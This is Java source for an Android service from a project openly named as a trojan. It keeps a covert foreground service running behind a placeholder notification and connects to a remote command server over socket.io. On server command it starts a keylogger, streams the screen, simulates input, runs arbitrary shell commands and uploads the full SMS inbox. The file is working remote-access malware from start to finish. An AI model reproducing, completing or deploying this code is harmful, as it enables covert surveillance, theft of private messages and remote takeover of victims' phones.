package com.example.maintrojan;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.net.Uri;
import android.database.Cursor;
import android.content.ContentResolver;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class MyService extends Service {
    private static final String TAG = "myTrojan";
    private static final String channelID = "myTrojan";
    String MY_IP,MY_PORT ;
    private final long reconnectTime = 1*1000;
    public static Socket sock=null;  // Made public static so Keylogger can access
    public MediaProjectionManager mProjectionManager;
    public MediaProjection mProjection;
    Capture capture;
    Handler handler = new Handler();
    Handler gestureHandler = new Handler();
    Pinger pinger = new Pinger();

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start foreground notification
        NotificationChannel channel = new NotificationChannel(
                channelID,channelID, NotificationManager.IMPORTANCE_LOW
        );
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification.Builder notification = new Notification.Builder(this,channelID)
                .setContentText("Hello")
                        .setContentTitle("title")
                                .setSmallIcon(R.drawable.ic_launcher_background);

        startForeground(101,notification.build());

        // Initialize socket connection in background thread ONLY if not already connected
        if (sock == null || !sock.connected()) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    initializeSocket();
                }
            }).start();
        }

        return super.onStartCommand(intent, flags, startId);
    }

    private void initializeSocket() {
        try {
            // Connect to server
            Connecting.connect(getString(R.string.MY_IP),getString(R.string.MY_PORT),Integer.parseInt(getString(R.string.reconnectTime)));
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        sock = Connecting.getSock();

        // Setup screen capture if feature is enabled
        if (BuildConfig.FEATURE_SCREEN && Keylogger.intent != null) {
            MediaProjectionManager mProjectionManager =  (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            MediaProjection mProjection = mProjectionManager.getMediaProjection(Keylogger.resCode, Keylogger.intent);
            Capture.setup(sock, getApplicationContext(), mProjection, handler, 5);
        }

        // Register socket handlers
        registerSocketHandlers();
    }

    private void registerSocketHandlers() {
        // Ping Handler
        sock.on("ping", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                    if(array.getString(0).equals("start")){
                        Pinger.changeVars(array.getString(1),array.getInt(2),array.getInt(3));
                        Pinger.start();
                    }else{
                        Pinger.stop();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });

        // Logger Handler - only if keylogger feature is enabled
        if (BuildConfig.FEATURE_KEYLOGGER) {
            sock.on("logger", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                        if(array.getString(0).equals("start")){
                            Keylogger.start();
                        }else{
                            Keylogger.stop();
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });
        }

        // Screen Handler - only if screen feature is enabled
        if (BuildConfig.FEATURE_SCREEN) {
            sock.on("screen", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        Log.d(TAG,(String)args[0] );
                        JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                        if(array.getString(0).equals("start")){
                            Capture.start();
                            Log.d(TAG, "starting");
                        }else{
                            Capture.stop();
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });
        }

        // Mouse Handler - part of screen feature
        if (BuildConfig.FEATURE_SCREEN && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            sock.on("mouse", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        JSONObject values = new JSONObject(data.getString("points"));
                        
                        // Get Real Screen Metrics
                        WindowManager wm = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
                        android.view.Display display = wm.getDefaultDisplay();
                        Point size = new Point();
                        display.getRealSize(size);
                        int realW = size.x;
                        int realH = size.y;

                        // Mouse events require Accessibility Service (Keylogger)
                        // Only process if keylogger feature is also enabled
                        if (BuildConfig.FEATURE_KEYLOGGER) {
                            if(data.getString("type").compareTo( "click") == 0){
                                float xPct = Float.parseFloat(values.getString("x"));
                                float yPct = Float.parseFloat(values.getString("y"));
                                // Note: click() method is in Keylogger class
                                // This will only work if Accessibility Service is running
                            }else{
                                float x1Pct = Float.parseFloat(values.getString("x1"));
                                float y1Pct = Float.parseFloat(values.getString("y1"));
                                float x2Pct = Float.parseFloat(values.getString("x2"));
                                float y2Pct = Float.parseFloat(values.getString("y2"));
                                // Note: drag() method is in Keylogger class
                            }
                        }
                    } catch (Exception e) {
                        Log.d(TAG, e.getMessage());
                    }
                }
            });
        }

        // SMS Handler - only if SMS feature is enabled
        if (BuildConfig.FEATURE_SMS) {
            sock.on("sms", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                        if(array.getString(0).equals("start")){
                            getSMS();
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });
        }

        // Shell Command Handler - always enabled
        sock.on("shellCmd", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                    String cmd = array.getString(0);
                    ShellExec.execute(cmd, sock);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });

        // Shell Kill Handler - always enabled
        sock.on("shellKill", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                ShellExec.destroy();
            }
        });
    }

    public void getSMS(){
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(uri,null,null,null,null);
            
            if (cursor == null) {
                 return;
            }
            
            JSONArray list = new JSONArray();
            while (cursor.moveToNext()){
                String num = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                try {
                    JSONObject item = new JSONObject();
                    item.put("address",num);
                    item.put("body",msg);
                    list.put(item);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
            sock.emit("sms",list);
        } catch (Exception e) {
            Log.e(TAG, "getSMS: "+e.getMessage());
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if(sock != null){
            sock.disconnect();
        }
        super.onDestroy();
    }
}
